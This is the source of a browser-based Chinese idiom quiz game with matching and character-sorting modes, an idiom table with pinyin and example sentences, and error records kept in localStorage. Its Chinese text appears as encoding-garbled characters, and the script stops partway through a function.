<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ¥·çƒè¡£è¡Œæˆèª</title>
	<link rel="stylesheet" href="https://oikasu1.github.io/fonts/twfonts.css">
	<script src="dict.js"></script>
    <style>

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
			user-select: none;
        }
        .container {
            background-color: white;
	  	    justify-content: center;
		    align-items: center;
            padding: 30px 20px 20px 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 800px;
            width: 100%;
        }
        .setup, .game {
            display: none;
        }
        .active {
            display: block;
        }
        select, button {
            margin: 10px;
            padding: 5px 10px;
        }
        .item-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 20px;
        }
        .left-item, .right-item {
            margin: 5px;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
			border: 2px solid #fff;			
        }

        .left-item:hover, .right-item:hover {
            background-color: #c0f0c0;
        }

        .left-item {
			background-color: #f3f3f3;
			font-family: BpmfZihiSans-Regular;	
			font-size: 1.3em;
        }

        .right-item {
			background-color: #eaeaea;
        }

        .selected {
            background-color: #4CAF50;
            color: white;
        }

        .selected:hover {
            background-color: #299920;
            color: white;
        }

        .selected-wrong {
            background-color: #CC5550;
            color: white;
        }

        .selected-wrong:hover {
            background-color: #CC5550;
            color: white;
        }

		.left-item.correct, .right-item.correct {
			background-color: #fff !important;
			color: #1B5E20;
			border: 2px solid #AACC88;
		}

        #start-button, #view-idioms-button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

		#next-button-container {
			display: flex;
			justify-content: space-between;
			margin-top: 10px;
		}
		#next-button, #end-button {
			width: calc(50% - 5px);
			height: 40px;
			padding: 10px;
			background-color: #4CAF50;
			color: white;
			border: none;
			border-radius: 5px;
			cursor: pointer;
			visibility: hidden;
			opacity: 0;
			transition: opacity 0.3s ease;
		}

		#next-button.visible, #end-button.visible {
			visibility: visible;
			opacity: 1;
		}



		#return-to-setup {
			display: block;
			margin-top: 20px;
			padding: 10px 20px;
			background-color: #4CAF50;
			color: white;
			border: none;
			border-radius: 5px;
			cursor: pointer;
		}
        .progress-container {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .close-button {
            margin-right: 40px;
            cursor: pointer;
            font-size: 20px;
        }

        .progress-bar {
            flex-grow: 1;
            height: 20px;
            background-color: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background-color: orange;
            width: 0%;
            transition: width 0.3s ease;
        }
        .round-info {
            margin-left: 10px;
            font-weight: bold;
        }
        #character {
		font-size: 1.5em;
            transition: transform 0.3s ease;
        }
        #character.animated {
            transform: scale(1.5);
        }

		.result {
			display: none;
	  	    justify-content: center;
		    align-items: center;
			margin: 20px auto;
			max-width: 400px;
			padding: 20px;
			border-radius: 10px;

		}

		.result h2 {
			text-align: center;
			margin-bottom: 20px;
			color: #333;
		}

		.result p {
			margin: 10px 0;
			font-size: 16px;
			color: #555;
		}

		.accuracy-container {
		 text-align: center;
		}

		.accuracy-bar {
			flex-grow: 1;
			height: 20px;
			background-color: #e0e0e0;
			border-radius: 10px;
			margin-left: 10px;
			overflow: hidden;
		}

		#accuracy-progress {
			height: 100%;
			background-color: orange;
			width: 0%;
			transition: width 0.5s ease-in-out;
		}

		#return-to-setup {
			display: block;
			width: 100%;
			margin-top: 20px;
			padding: 10px;
			background-color: #4CAF50;
			color: white;
			border: none;
			border-radius: 5px;
			cursor: pointer;
			font-size: 16px;
			transition: background-color 0.3s;
		}

		#return-to-setup:hover {
			background-color: #45a049;
		}

		@media (max-width: 768px) {
			.right-item {
				margin-top: 10px;
				margin-bottom: 10px;
			}
		}

		@media (max-width: 768px) {
			.game {
				height: 90vh;
				overflow-y: auto;
				scrollbar-width: none;
				-ms-overflow-style: none;
			}

			.game::-webkit-scrollbar {
				display: none;
			}
		}

		@media (max-width: 768px) {
			.item-container {
				flex-direction: column;
				align-items: stretch;
			}

			#leftContainer {
				flex-direction: row;
				flex-wrap: wrap;
				justify-content: space-between;
			}

			#leftContainer .left-item {
				width: calc(50% - 10px);
				box-sizing: border-box;\				
			}

			#rightContainer .right-item {
				width: calc(100% - 30px);
				margin-bottom: 10px;
			}

			#next-button-container {
				flex-direction: row;
			}

			#next-button, #end-button {
				width: calc(50% - 5px);
			}


		}

		.sound-button {

			margin: 0px 5px;
			cursor: pointer;
			font-size: 20px;
		}

.idiom-list {
    background-color: white;
    padding: 10px 20px;
    border-radius: 10px;
    width: calc(100% - 40px);
    margin: 0 auto;
	height: 70vh;
    position: relative;
}

.idiom-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    position: relative;
}

.idiom-header h2 {
    margin: 0;
    flex-grow: 1;
    text-align: center;
}

.idiom-header .close-button {
    position: absolute;
    right: 0;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    font-size: 1.5em;
    cursor: pointer;
    padding: 0;
}

.list-close-button {
    background: none;
    border: none;
    font-size: 1.2em;
    cursor: pointer;
    padding: 0;
}

/* ç¢ºä¿å…¶ä»–é—œé–‰æŒ‰éˆ•ä¸å—å½±éŸ¿ */
.close-button:not(#close-idiom-list) {
    position: static;
    transform: none;
}





.close-button {
    background: none;
    border: none;
    font-size: 1.5em;
    cursor: pointer;
    color: #333;
}

.idiom-controls {
    margin-bottom: 10px;
}

.idiom-controls label {
    margin-right: 10px;
}




.idiom-table-container {
    overflow-x: auto;
    max-height: calc(80vh - 130px);
}

#idiom-table {
    width: 100%;
    border-collapse: collapse;
}

#idiom-table thead {
    position: sticky;
    top: 0;
	padding: 20px;
    background-color: #f2f2f2;
    z-index: 1;
}

#idiom-table th  {
    border: 1px solid #ddd;
    padding: 10px;
    text-align: center;
}

#idiom-table td {
    border: 1px solid #ddd;
    padding: 5px 5px 5px 10px;
    text-align: left;
}



.small-number{
    color: #ff5555;
	font-size: 0.4em;
}

.idiom {
    min-width: 130px;
	font-size: 1.1em;
	font-family: BpmfZihiSans-Regular;
}




#idiom-table th {
    background-color: #e1e1e1;
}

#idiom-table tbody tr:nth-child(odd) {
    background-color: #f8f8f8;
}

#idiom-table tbody tr:nth-child(even) {
    background-color: #fefefe;
}

@media (max-width: 768px) {
    .idiom-list {
        padding: 10px;
        max-height: 90vh;
    }

    .idiom-controls {
        display: flex;
        flex-wrap: wrap;
    }

    .idiom-controls label {
        margin-bottom: 10px;
    }

    #idiom-table {
        font-size: 14px;
    }
    
    #idiom-table th, #idiom-table td {
        padding: 5px;
    }
}

.nav-button {
    padding: 5px 10px;
    background-color: #4CAF50;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s;
}

.nav-button:hover {
    background-color: #45a049;
}

.nav-button:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
}
.font-toggle-button {
    width: 24px;
    height: 24px;
    border-radius: 50%;
    border: 1px solid #4CAF50;
    background-color: white;
    color: #4CAF50;
    font-size: 12px;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    margin-right: 5px;
}

#clear-records {
    background-color: #f44336;
    color: white;
    border: none;
    padding: 5px 10px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 12px;
    margin: 10px 5px 0 5px;
    cursor: pointer;
    border-radius: 50px;
    transition: background-color 0.3s;
}

#clear-records:hover {
    background-color: #d32f2f;
}

#clear-records:active {
    background-color: #b71c1c;
}

#clear-records:disabled {
    background-color: #cccccc;
    color: #666666;
    cursor: not-allowed;
}

.sorting-area {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 20px 0;
}

.answer-area {
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    min-height: 65px;
    border-bottom: 2px solid #eee;
    width: 90%;
    padding: 10px;
    margin-bottom: 10px;
}


.character-options {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    margin-bottom: 10px;
}

.character-option, .in-answer {
    font-size: 1.5em;
    margin: 5px;
    padding: 8px;
    background-color: #f0f0f0;
    border: 1px solid #ccc;
    border-radius: 5px;
    cursor: pointer;
}

.check-button {
    margin-top: 10px;
    padding: 10px 20px;
    background-color: #4CAF50;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 1em;
}

.check-button:disabled {
	visibility: hidden;
}

.idiom-question {
    margin-bottom: 0px;
}


.character-option:hover, .in-answer:hover {
    background-color: #e0e0e0;
}



.in-answer {
    font-size: 1.5em;
    margin: 5px;
    padding: 10px;
    background-color: #e0f0e0;
    border: 1px solid #ccc;
    border-radius: 5px;
    cursor: pointer;
    display: inline-block;
}

        @keyframes jumpAnimation {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        @keyframes shakeAnimation {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-3px); }
            75% { transform: translateX(3px); }
        }

        .jump {
            animation: jumpAnimation 0.3s ease;
        }

        .shake {
            animation: shakeAnimation 0.3s ease;
        }


    </style>
</head>
<body>
    <div class="container">
		<div class="setup active" id="setup">
			<h1 id="myTitle">ğŸ¥·çƒè¡£è¡Œæˆèª</h1>
			<div>
				<label for="category-select">åˆ†é¡ï¼š</label>
				<select id="category-select">
					<option value="all">æ‰€æœ‰åˆ†é¡</option>
					<!-- å…¶ä»–åˆ†é¡é¸é …å°‡åœ¨é€™è£¡å‹•æ…‹ç”Ÿæˆ -->
				</select>
			</div>
			<div>
				<label for="match-type-select">é…å°ï¼š</label>
				<select id="match-type-select">
					<option value="æˆèª-è¡¨é”æ„æ€">æˆèª - è¡¨é”æ„æ€</option>
					<option value="æˆèª-å­—é¢æ„æ€">æˆèª - å­—é¢æ„æ€</option>
					<option value="æˆèª-ä¾‹å¥">æˆèª - ä¾‹å¥</option>
					<option value="æˆèª-æ’åº">æˆèª - æ’åº</option>
				</select>
			</div>
			<div>
				<label for="order-select">é †åºï¼š</label>
				<select id="order-select">
					<option value="random">éš¨æ©Ÿ</option>
					<option value="sequential">ä¾åº</option>
				</select>
			</div>			
			<button id="view-idioms-button">æª¢è¦–æˆèª ğŸ”</button>
			<button id="start-button">é–‹å§‹éŠæˆ² ğŸš€</button>
		</div>

		<div class="game" id="game">
			<div class="progress-container">
				<div class="close-button" id="close-button">âœ–ï¸</div>				
				<div class="progress-bar">
					<div class="progress" id="progress"></div>
				</div>
				<div class="round-info" id="round-info"></div>
				<div class="sound-button" id="sound-button">ğŸ””</div>
				<div class="font-toggle-button" id="font-toggle-button">å­—</div>
			</div>
			<h1><span id="character">ğŸ™‚</span></h1>
			<div id="left-right-container">
				<div class="item-container" id="leftContainer"></div>
				<div class="item-container" id="rightContainer"></div>
			</div>
			<div id="sorting-container" style="display: none;">
				<div class="idiom-question" id="idiom-question"></div>
				<div class="sorting-area">
					<div id="answer-area" class="answer-area"></div>
					<div id="character-options" class="character-options"></div>
				</div>
				<button id="check-answer" class="check-button">ç¢ºå®š</button>
			</div>
			<div id="next-button-container">                
				<button id="end-button">ğŸ‰ çµæŸ</button>
				<button id="next-button">ä¸‹ä¸€é¡Œ ğŸš€</button>
			</div>
		</div>

		<div class="idiom-list" id="idiom-list" style="display: none;">
			<div class="idiom-header">
			<button id="close-idiom-list" class="list-close-button">âœ–ï¸</button><button id="prev-category" class="nav-button">ä¸Šä¸€åˆ†é¡</button>
				<h2>ğŸ¥·æˆèª</h2>
				
				<button id="next-category" class="nav-button">ä¸‹ä¸€åˆ†é¡</button><div class="font-toggle-button" id="list-font-toggle-button">å­—</div>
			</div>

			<div class="idiom-controls">
				<label><input type="checkbox" id="show-category" checked>åˆ†é¡</label>
				<label><input type="checkbox" id="show-idiom" checked>æˆèª</label>
				<label><input type="checkbox" id="show-literal" checked>å­—é¢</label>
				<label><input type="checkbox" id="show-figurative" checked>ç”¨æ„</label>
				<label><input type="checkbox" id="show-example">ä¾‹å¥</label>
			</div>
			<div class="idiom-table-container">
				<table id="idiom-table">
					<thead>
						<tr>
							<th class="category">åˆ†é¡</th>
							<th class="idiom">æˆèª</th>
							<th class="literal">å­—é¢æ„æ€</th>
							<th class="figurative">è¡¨é”æ„æ€</th>
							<th class="example">ä¾‹å¥</th>
						</tr>
					</thead>
					<tbody>
						<!-- æˆèªè³‡æ–™å°‡åœ¨é€™è£¡å‹•æ…‹ç”Ÿæˆ -->
					</tbody>
				</table>
			</div>
		</div>

		<div id="result" class="result">
			<h2>ğŸ¥·çƒè¡£è¡Œæˆèª</h2>
		
				<div class="accuracy-bar">
					<div id="accuracy-progress"></div>
				</div>

			<div class="accuracy-container">		
				<p id="accuracy"></p>
				<p id="time-spent"></p>
				<p id="total-rounds"></p>
				<p id="total-pairs"></p>
				<p id="selected-category"></p>
				<p id="match-type-result"></p>
				<p id="order-type-result"></p>
			</div>
			<button id="clear-records" disabled>æ¸…é™¤ç´€éŒ„ ğŸ—‘ï¸</button>
			<button id="return-to-setup">è¿”å› ğŸ›¸</button>
		</div>

    </div>

    <script>
        const idiomsData = `
åˆ†é¡	æˆèª	å­—é¢æ„æ€	è¡¨é”æ„æ€	ä¾‹å¥	æ‹¼éŸ³
A01	è€³æé¢å‘½	åœ¨è€³é‚Šæé†’ï¼Œé¢å‰å®å›‘ï¼Œæ‚‰å¿ƒæ•™èª¨ã€‚	è€å¿ƒæŒ‡å°ï¼Œè¦ªè‡ªæ•™èª¨ã€‚	è€å¸«å°æˆ‘å€‘è€³æé¢å‘½ï¼Œæé†’æˆ‘å€‘ç´°ç¯€ã€‚|è€å¸«å°ä»–è€³æé¢å‘½ï¼Œåè¦†å®å›‘ã€‚	er3 ti2 mian4 ming4
A01	å€ŸèŠ±ç»ä½›	å€Ÿä»–äººä¹‹ç‰©ï¼Œå‘ä½›ç»ç¦®ï¼Œæ¯”å–»å€Ÿç‰©é€äººã€‚	æ‹¿ä»–äººæ±è¥¿åšäººæƒ…ã€‚	é€™æŸèŠ±æ˜¯å€ŸèŠ±ç»ä½›ï¼Œé€çµ¦æ‚¨çš„ã€‚|ä»–ç”¨æœ‹å‹çš„é»å­å€ŸèŠ±ç»ä½›ã€‚	jie4 hua1 xian4 fo2
A01	ç²¾è¡›å¡«æµ·	ç²¾è¡›é³¥å¡«æµ·ä¸æ‡ˆï¼Œæ¯”å–»æ„å¿—å …å¼·ã€‚	æ±ºå¿ƒå …å®šï¼Œä¸ç•è‰±é›£ã€‚	ä»–æ¯å¤©åŠªåŠ›å­¸ç¿’ï¼ŒçœŸæœ‰ç²¾è¡›å¡«æµ·çš„ç²¾ç¥ã€‚|å°ç¾ç‚ºå¤¢æƒ³ç²¾è¡›å¡«æµ·ï¼Œä¸ç•è‰±é›£ã€‚	jing1 wei4 tian2 hai3
A01	è‰¯è—¥è‹¦å£	å¥½è—¥é›–è‹¦ï¼Œå»èƒ½æ²»ç—…ï¼Œæ¯”å–»å¿ è¨€é€†è€³ã€‚	å¿ è¨€å¤šåŠä¸ä¸­è½ã€‚	ä»–çš„å»ºè­°é›–ç„¶åˆºè€³ï¼Œä½†è‰¯è—¥è‹¦å£ã€‚|ä»–çš„æ‰¹è©•é›–ç„¶åˆºè€³ï¼Œä½†è‰¯è—¥è‹¦å£ã€‚	liang2 yao4 ku3 kou3
A01	å¤©ç¿»åœ°è¦†	å¤©åœ°é¡›å€’ï¼Œæ¯”å–»è®ŠåŒ–åŠ‡çƒˆã€‚	è®ŠåŒ–å·¨å¤§ï¼Œå®Œå…¨ä¸åŒã€‚	ç¶“éæ”¹é©ï¼Œå…¬å¸çš„é¢è²Œå¤©ç¿»åœ°è¦†ã€‚|ç§‘æŠ€é€²æ­¥è®“ç”Ÿæ´»å¤©ç¿»åœ°è¦†ã€‚	tian1 fan1 di4 fu4
A01	æ‰“é€€å ‚é¼“	åœ¨é€€å ‚æ™‚æ•²é¼“ï¼Œæ¯”å–»ä¸­é€”é€€ç¸®ã€‚	ä¸­é€”é€€ç¸®ï¼Œä¸å†å …æŒã€‚	é‡åˆ°å›°é›£å°±æƒ³æ‰“é€€å ‚é¼“ï¼Œæ€éº¼è¡Œå‘¢ï¼Ÿ|é‡åˆ°å›°é›£ï¼Œä»–å·®é»æ‰“é€€å ‚é¼“ã€‚	da3 tui4 tang2 gu3
A01	ç¿»å±±è¶Šå¶º	è¶Šéå±±å¶ºï¼Œæ¯”å–»æ­·ç¶“è‰±é›£ã€‚	å…‹æœå›°é›£ï¼ŒåŠªåŠ›å‰é€²ã€‚	ä»–ç¿»å±±è¶Šå¶ºï¼Œçµ‚æ–¼æ‰¾åˆ°é‚£ä½è€å¸«ã€‚|ä»–å€‘ç¿»å±±è¶Šå¶ºï¼Œåªç‚ºçœ‹æ—¥å‡ºã€‚	fan1 shan1 yue4 ling3
A01	æŠ«æ˜Ÿæˆ´æœˆ	é ‚æ˜Ÿæ˜Ÿï¼Œå¸¶æœˆäº®ï¼Œæ¯”å–»é€£å¤œå¥”æ³¢ã€‚	æ—©å‡ºæ™šæ­¸ï¼Œå‹¤å¥®å‹ä½œã€‚	ä»–æ¯å¤©æŠ«æ˜Ÿæˆ´æœˆï¼Œç‚ºäº†å®¶äººåŠªåŠ›å·¥ä½œã€‚|çˆ¸çˆ¸æ¯å¤©æŠ«æ˜Ÿæˆ´æœˆåœ°å·¥ä½œã€‚	pi1 xing1 dai4 yue4
A02	æ‡¸å´–å‹’é¦¬	åˆ°äº†æ‡¸å´–ï¼Œå‹’ä½é¦¬ï¼Œå³æ™‚åœæ­¢ã€‚	åŠæ™‚å›é ­ï¼Œé¿å…å±éšªã€‚	ä»–åœ¨éŒ¯èª¤é‚Šç·£æ‡¸å´–å‹’é¦¬ï¼ŒåŠæ™‚å›é ­ã€‚|åœ¨æœ€å±éšªçš„æ™‚å€™ï¼Œä»–æ‡¸å´–å‹’é¦¬ã€‚	xuan2 ya2 le4 ma3
A02	å…¢å…¢æ¥­æ¥­	å°å¿ƒè¬¹æ…ï¼ŒèªçœŸè² è²¬ã€‚	å°å¿ƒè¬¹æ…ï¼ŒèªçœŸè² è²¬ã€‚	ä»–å…¢å…¢æ¥­æ¥­åœ°å®Œæˆæ¯ä¸€é …å·¥ä½œã€‚|ä»–å°å·¥ä½œç¸½æ˜¯å…¢å…¢æ¥­æ¥­ã€‚	jing1 jing1 ye4 ye4
A02	é›çŠ¬ä¸å¯§	é€£é›çŠ¬ä¹Ÿä¸å¾—å®‰å¯§ï¼Œæ¯”å–»é¨·äº‚ä¸å®‰ã€‚	æ··äº‚ä¸å®‰ï¼Œç„¡æ³•å®‰éœã€‚	æœ€è¿‘çš„å·¥ç¨‹è®“é„°å±…å€‘é›çŠ¬ä¸å¯§ã€‚|å°å­©é¬§é¨°å¾—å®¶è£¡é›çŠ¬ä¸å¯§ã€‚	ji1 quan3 bu4 ning2
A02	ä¸€è¦–åŒä»	åŒæ¨£çœ‹å¾…ä»–äººï¼Œä¸åˆ†åšè–„ã€‚	ä¸åˆ†åšè–„ï¼Œå¹³ç­‰å°å¾…ã€‚	è€å¸«å°æ‰€æœ‰å­¸ç”Ÿä¸€è¦–åŒä»ï¼Œä¸åä¸å€šã€‚|è€å¸«å°æ¯ä½å­¸ç”Ÿä¸€è¦–åŒä»ã€‚	yi1 shi4 tong2 ren2
A02	å­¤æ³¨ä¸€æ“²	æŠ•å…¥å…¨éƒ¨è³­æ³¨ï¼Œæ¯”å–»å­¤å‹‡å†’éšªã€‚	å†’éšªä¸€æï¼Œä¸ç•™é€€è·¯ã€‚	ä»–å°‡å…¨éƒ¨è³‡é‡‘å­¤æ³¨ä¸€æ“²ï¼ŒæŠ•è³‡é€™é …è¨ˆç•«ã€‚|ä»–ç‚ºäº†æˆåŠŸå­¤æ³¨ä¸€æ“²ã€‚	gu1 zhu4 yi1 zhi4
A02	ç›¡å–„ç›¡ç¾	ä¸€åˆ‡å®Œç¾ç„¡ç¼ºï¼Œæ¥µè‡´å®Œç¾ã€‚	å®Œç¾ç„¡ç‘•ï¼Œç„¡å¯æŒ‘å‰”ã€‚	ä»–æŠŠé€™æ¬¡ä½œå“åšåˆ°ç›¡å–„ç›¡ç¾ã€‚|ä»–è¿½æ±‚æŠŠä½œå“åšå¾—ç›¡å–„ç›¡ç¾ã€‚	jin4 shan4 jin4 mei3
A02	ç§€å¤–æ…§ä¸­	å¤–è¡¨ç§€éº—ï¼Œå…§å¿ƒæ™ºæ…§ã€‚	å¤–è¡¨ç§€éº—ï¼Œå…§å¿ƒè°æ…§ã€‚	å¥¹ä¸åƒ…æ¼‚äº®ï¼Œé‚„ç§€å¤–æ…§ä¸­ã€‚|å¥¹ä¸åƒ…æ¼‚äº®ï¼Œæ›´æ˜¯ç§€å¤–æ…§ä¸­ã€‚	xiu4 wai4 hui4 zhong1
A02	è±ç„¶é–‹æœ—	è±ç„¶æ˜æœ—ï¼Œæ¯”å–»å¿½ç„¶æ˜ç™½ã€‚	å¿ƒå¢ƒé “æ‚Ÿï¼ŒèŒ…å¡é “é–‹ã€‚	ä»–è½å®Œå»ºè­°å¾Œï¼Œå¿ƒä¸­è±ç„¶é–‹æœ—ã€‚|ç¶“éæŒ‡é»ï¼Œä»–é “æ™‚è±ç„¶é–‹æœ—ã€‚	huo4 ran2 kai1 lang3
A02	ç™»å³°é€ æ¥µ	ç™»ä¸Šé«˜å³°ï¼Œæ¯”å–»é”åˆ°æ¥µè‡´ã€‚	é”åˆ°æœ€é«˜å¢ƒç•Œã€‚	ä»–çš„è—è¡“æˆå°±å·²ç¶“ç™»å³°é€ æ¥µã€‚|ä»–çš„æŠ€è¡“å·²é”ç™»å³°é€ æ¥µçš„å¢ƒç•Œã€‚	deng1 feng1 zao4 ji2
A02	è™›æ‡·è‹¥è°·	èƒ¸æ‡·å¦‚è°·åœ°èˆ¬å¯¬é—Šï¼Œæ¯”å–»è¬™è™›ã€‚	è¬™è™›è¬¹æ…ï¼Œè™›å¿ƒå­¸ç¿’ã€‚	ä»–å¾…äººè™›æ‡·è‹¥è°·ï¼Œååˆ†è¬™è™›ã€‚|ä»–ç‚ºäººè¬™éœï¼Œè™›æ‡·è‹¥è°·ã€‚	xu1 huai2 ruo4 gu3
A02	ä¸åŒå‡¡éŸ¿	è²éŸ³ä¸åŒå¸¸äººï¼Œæ¯”å–»å“è¶Šå‡ºçœ¾ã€‚	å‡ºçœ¾éå‡¡ï¼Œèˆ‡çœ¾ä¸åŒã€‚	å¥¹çš„æ¼”è¬›çœŸæ˜¯ä¸åŒå‡¡éŸ¿ï¼Œæ‰“å‹•äººå¿ƒã€‚|å¥¹çš„è¡¨æ¼”ç¢ºå¯¦ä¸åŒå‡¡éŸ¿ã€‚	bu4 tong2 fan2 xiang3
A02	åƒè®Šè¬åŒ–	åƒè¬ç¨®è®ŠåŒ–ï¼Œå½¢å®¹è®ŠåŒ–å¤šç«¯ã€‚	è®ŠåŒ–å¤šç«¯ï¼Œç„¡æ³•é æ¸¬ã€‚	å¤©ç©ºçš„é›²å±¤åƒè®Šè¬åŒ–ï¼Œç¾ä¸å‹æ”¶ã€‚|æ™‚å°šçš„æµè¡Œé¢¨æ ¼åƒè®Šè¬åŒ–ã€‚	qian1 bian4 wan4 hua4
A02	ä¸çŸ¥ä¸è¦º	ç„¡è‡ªè¦ºåœ°ç™¼ç”Ÿæˆ–ç™¼ç¾ã€‚	ç„¡æ„é–“ï¼Œä¸çŸ¥ä¸è¦ºä¸­ã€‚	ä¸çŸ¥ä¸è¦ºä¸­ï¼Œæ™‚é–“å·²ç¶“éå»ä¸€æ•´å¤©ã€‚|èŠè‘—èŠè‘—ï¼Œä¸çŸ¥ä¸è¦ºå¤©äº®äº†ã€‚	bu4 zhi1 bu4 jue2
A02	ä¸çŸ¥æ‰€æª	ä¸çŸ¥å¦‚ä½•æ‡‰å°ï¼Œå½¢å®¹æ…Œå¼µã€‚	é©šæ…Œå¤±æªï¼Œç„¡æ³•æ‡‰å°ã€‚	è½åˆ°é€™æ¶ˆæ¯ï¼Œä»–ä¸€æ™‚ä¸çŸ¥æ‰€æªã€‚|çªå¦‚å…¶ä¾†çš„è®Šæ•…è®“ä»–ä¸çŸ¥æ‰€æªã€‚	bu4 zhi1 suo3 cuo4
`;



const dictMap = new Map(dictData.trim().split('\n').map(line => {
    const [pinyin, chars] = line.split('\t');
	const charsSplit = Array.from(chars);
    return [pinyin, charsSplit];
}));

function getPinyinArray(pinyinString) {
    return pinyinString.split(/ +/);
}

function getRandomCharForPinyin(pinyin, excludeChars) {
    const chars = dictMap.get(pinyin) || [];
    const availableChars = chars.filter(char => !excludeChars.includes(char));
    return availableChars[Math.floor(Math.random() * availableChars.length)];
}


function removeBPMCharacters(str) {
    return str.replace(/[ó ‡ ó ‡¡ó ‡¢ó ‡£ó ‡¤ó ‡¥ó ‡¦ó ‡§ó ‡¨ó ‡©]/gu, '');
}

const idioms = idiomsData.trim().split('\n').slice(1).map(line => {
    const [åˆ†é¡, æˆèª, å­—é¢æ„æ€, è¡¨é”æ„æ€, ä¾‹å¥, æ‹¼éŸ³] = line.split('\t');
    const idiomNoBPM = removeBPMCharacters(æˆèª);
    return { åˆ†é¡, æˆèª, idiomNoBPM, å­—é¢æ„æ€, è¡¨é”æ„æ€, ä¾‹å¥, æ‹¼éŸ³ };
});

        const categories = [...new Set(idioms.map(idiom => idiom.åˆ†é¡))];
        const categorySelect = document.getElementById('category-select');
        categories.forEach(category => {
            const option = document.createElement('option');
            option.value = category;
            option.textContent = category;
            categorySelect.appendChild(option);
        });

let currentIdioms = [];
let selectedLeft = null;
let selectedRight = null;
let matchType = 'æˆèª-è¡¨é”æ„æ€';
// const matchType = document.getElementById('match-type-select').value;
let currentIndex = 0;
let orderedIdioms = [];
let totalRounds = 0;
let currentRound = 0;
const idiomsPerRound = 4;
let startTime;
let correctPairs = 0;
let totalPairs = 0;
let isSoundOn = true;
let currentCategoryIndex = 0;
let currentFont = 'BpmfZihiSans-Regular';
let currentFontState = 'zih';
let currentFontSize = '1.3em';
const idiomLocalName = "j01";

const happyEmojis = "ğŸ¥°ğŸ˜›ğŸ¤—ğŸ˜„ğŸ˜ğŸ¤©ğŸ˜˜ğŸ˜šğŸ˜‹ğŸ˜ŠğŸ˜†ğŸ˜ğŸ˜„ğŸ˜ƒ";
const sadEmojis = "ğŸ˜ŸğŸ˜®ğŸ¥ºğŸ˜§ğŸ˜¨ğŸ˜¥ğŸ˜¢ğŸ˜­ğŸ˜±ğŸ˜–ğŸ˜©ğŸ˜¤";

const rightAudio = new Audio('right.mp3');
const wrongAudio = new Audio('wrong.mp3');

function playAudio(audio) {
    if (isSoundOn) {
        audio.currentTime = 0;
        audio.play();
    }
}

// å¾ localStorage è®€å–éŒ¯èª¤è¨˜éŒ„
function getErrorRecords() {
    const records = localStorage.getItem(`${idiomLocalName}_errorRecords`);
    return records ? JSON.parse(records) : {};
}

// ä¿å­˜éŒ¯èª¤è¨˜éŒ„åˆ° localStorage
function saveErrorRecords(records) {
    localStorage.setItem(`${idiomLocalName}_errorRecords`, JSON.stringify(records));
}

// æ›´æ–°éŒ¯èª¤è¨˜éŒ„
function updateErrorRecord(idiom) {
    const records = getErrorRecords();
    records[idiom] = (records[idiom] || 0) + 1;
    saveErrorRecords(records);
}

// æ¸…é™¤éŒ¯èª¤è¨˜éŒ„
function clearErrorRecords() {
    localStorage.removeItem(`${idiomLocalName}_errorRecords`);
}

document.getElementById('sound-button').onclick = toggleSound;

function toggleFont() {
    const fontToggleButton = document.getElementById('font-toggle-button');
	const ListfontToggleButton = document.getElementById('list-font-toggle-button');

    const leftItems = document.querySelectorAll('.left-item');
	const idioms = document.querySelectorAll('.idiom');

    switch(currentFontState) {
        case 'zih':
            currentFontState = 'box';
            fontToggleButton.textContent = 'æ¡†';
			ListfontToggleButton.textContent = 'æ¡†';
			currentFont = 'BpmfZihiBox-R';
			currentFontSize = '1.4em';

			leftItems.forEach(item => {
				item.style.fontFamily = 'BpmfZihiBox-R';
				item.style.fontSize = '1.4em';
			});
			idioms.forEach(item => {
				item.style.fontFamily = 'BpmfZihiBox-R';
				item.style.fontSize = '1.4em';
				item.style.minWidth = '160px';
			});
            break;
        case 'box':
            currentFontState = 'bpmf';
            fontToggleButton.textContent = 'éŸ³';
			ListfontToggleButton.textContent = 'éŸ³';
			currentFont = 'BpmfZihiOnly-R';
			currentFontSize = '2em';

			leftItems.forEach(item => {
				item.style.fontFamily = 'BpmfZihiOnly-R';
				item.style.fontSize = '2em';
			}); 
			idioms.forEach(item => {
				item.style.fontFamily = 'BpmfZihiOnly-R';
				item.style.fontSize = '1.6em';
				item.style.minWidth = '120px';
			}); 
            break;
        case 'bpmf':
            currentFontState = 'zih';
            fontToggleButton.textContent = 'å­—';
			ListfontToggleButton.textContent = 'å­—';
			currentFont = 'BpmfZihiSans-Regular';
			currentFontSize = '1.3em';

			leftItems.forEach(item => {
				item.style.fontFamily = 'BpmfZihiSans-Regular';
				item.style.fontSize = '1.3em';
			}); 
			idioms.forEach(item => {
				item.style.fontFamily = 'BpmfZihiSans-Regular';
				item.style.fontSize = '1em';
				item.style.minWidth = '120px';

			}); 
            break;
    }
}

function toggleSound() {
    isSoundOn = !isSoundOn;
    const soundButton = document.getElementById('sound-button');
    soundButton.textContent = isSoundOn ? 'ğŸ””' : 'ğŸ”•';
}

function showEndButton() {
    const endButton = document.getElementById('end-button');
    endButton.classList.add('visible');
}

function hideEndButton() {
    const endButton = document.getElementById('end-button');
	endButton.blur();
    endButton.classList.remove('visible');
}

function shuffleArray(array) {
